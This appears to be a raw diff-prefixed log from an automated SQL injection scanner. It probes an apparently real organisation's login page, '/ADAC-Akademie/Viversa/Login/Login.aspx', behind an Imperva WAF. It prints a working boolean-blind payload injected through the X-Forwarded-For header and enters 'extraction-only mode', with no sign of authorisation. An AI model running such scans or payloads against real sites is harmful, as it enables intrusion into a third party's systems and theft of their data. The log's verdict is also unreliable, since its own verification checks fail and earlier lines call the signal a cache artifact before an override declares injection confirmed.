+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (3 near-zero + 2 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#193)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#194)
+    [B-bool] [MySQL] 'path-injection' req#54 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#195)
+[*]    Wasserstein comparison probe (param='path-injection' req#55)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#196)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#197)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#198)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#199)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#200)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#201)
+    [B-bool] [MySQL] 'path-injection' req#56 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#57)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#202)
+    [B-bool] [MySQL] 'path-injection' req#54 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#203)
+    [B-bool] [MySQL] 'path-injection' req#64 sim=0.438 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#55)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#204)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#205)
+[*]    Wasserstein comparison probe (param='path-injection' req#65)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#206)
+    [B-bool] [MySQL] 'path-injection' req#58 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#59)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#207)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#119 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#120)
+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (2 near-zero + 3 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#208)
+    [B-bool] [MySQL] 'path-injection' req#56 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'path-injection' req#66 sim=0.438 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#57)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#209)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#210)
+[*]    Wasserstein comparison probe (param='path-injection' req#67)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#211)
+    [B-bool] [MySQL] 'path-injection' req#60 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#61)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#212)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#213)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#214)
+    [B-bool] [MySQL] 'path-injection' req#58 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#59)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#215)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#216)
+    [B-bool] [MySQL] 'path-injection' req#62 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#63)
+[*]   [Wasserstein] dist=0.6758 STABLE-PAGE OUTLIER (4/5 probes below 0.15, only 1 above threshold=0.30) -- CDN/cache miss, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#217)
+    [B-bool] [MySQL] 'path-injection' req#69 sim=0.438 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'path-injection' req#60 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#61)
+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (3 near-zero + 2 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#218)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#219)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#220)
+[*]    Wasserstein comparison probe (param='path-injection' req#70)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#221)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#222)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#125 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#126)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#223)
+[*]    Wasserstein comparison probe (param='path-injection' req#32)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#224)
+    [B-bool] [MySQL] 'path-injection' req#65 sim=0.438 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#66)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#225)
+    [B-bool] [MySQL] 'path-injection' req#71 sim=0.438 combined=0.700 thresh=0.850 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#226)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#127 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#128)
+[+]   [Wasserstein] secondary oracle confirmed (dist=0.6758, threshold=0.30)  accepting boolean detection
+[*] Running PCV on B→B detection (MySQL)...
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*] [diag] _try_technique: tech=B dbms=MySQL templates=3181 → testing 636 payloads
+[*]    Wasserstein comparison probe (param='path-injection' req#72)
+[*] [diag] _try_technique: tech=B dbms=MySQL templates=3181 → testing 636 payloads
+[*] [diag] _try_technique: tech=B dbms=MySQL templates=3181 → testing 636 payloads
+[*] [diag] _try_technique: tech=B dbms=MySQL templates=3181 → testing 636 payloads
+    [CTX-bool] order_by: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] order_by: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] order_by: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] limit_offset: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] limit_offset: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] where_equals: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] limit_offset: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] where_equals: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] having: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] where_equals: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] having: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] group_by: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] having: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] group_by: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] group_by: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] string_concat: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] string_concat: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] order_by: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] numeric_where: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#227)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#228)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#229)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#230)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#231)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#232)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#233)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#234)
+    [CTX-bool] numeric_where: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#235)
+    [CTX-bool] limit_offset: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] string_concat: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#236)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#237)
+    [CTX-bool] where_equals: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#238)
+    [CTX-bool] numeric_where: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#239)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#240)
+    [CTX-bool] having: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#241)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#242)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#243)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#244)
+[*]     Check A (body canary): FAIL (no-gap-above-threshold)
+[*]     Check C (error fingerprint): FAIL ()
+[*]     Check D (header diff): FAIL (0 diffs)
+    [CTX-bool] group_by: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#245)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#246)
+[*]     Check E (MySQL SQL): skipped (boolean technique (Check A already covers this mechanism))
+[+] PCV FP-Guards WASSR OVERRIDE (preconfirmed-direct) [B→B] MySQL fp-guards-conf=1.0000 ≥ 1.0 — detection-time statistical FP guards confirmed injection; live re-probe skipped (WAF blocks bypass-less canary probes)
+[!] [Gate] KILL  all scanning stopped, extraction-only mode
+[+] PCV CONFIRMED [B] MySQL  injection verified!
+
+[!!] SQL injection confirmed!
+    Parameter : 'X-Forwarded-For'
+    URL       : /ADAC-Akademie/Viversa/Login/Login.aspx*
+    Technique : B
+    DBMS      : MySQL
+    Bypass    : none
+    Confidence: 89%
+    Payload   : '127.0.0.1/*1*/and\t/* req */false--/* fn */-'
+    Requests  : 128
+
+[+] Vulnerability confirmed  param='X-Forwarded-For' technique=B dbms=MySQL
+[+] BG injection confirmed  primary scan cancelled for fast extraction
+[+] Injection confirmed  cancelled remaining background scans
+[*] Collecting background surface results...
+[+] [*] Skipping extended surfaces  injection already confirmed
+[+] 
+
+[+] Scan complete   180.46s
+[+] Requests sent   295
+[+] DBMS            MySQL
+[+] WAF             Imperva
+[+] Vulnerabilities 1 (X-Forwarded-For)
+[+] 
+[+] Report: 1 findings, 1 unique root causes
+[+] Report  output/sqlreaper_13bf1c985b92a713_1785689958.json
+[+] Executive summary  output/executive_summary.txt
+[+] Confidence matrix  output/confidence_matrix.md
+[+] [Session] Scan complete  saved session cleared
+[+] Response dedup hit rate: 0.0%
+                                        
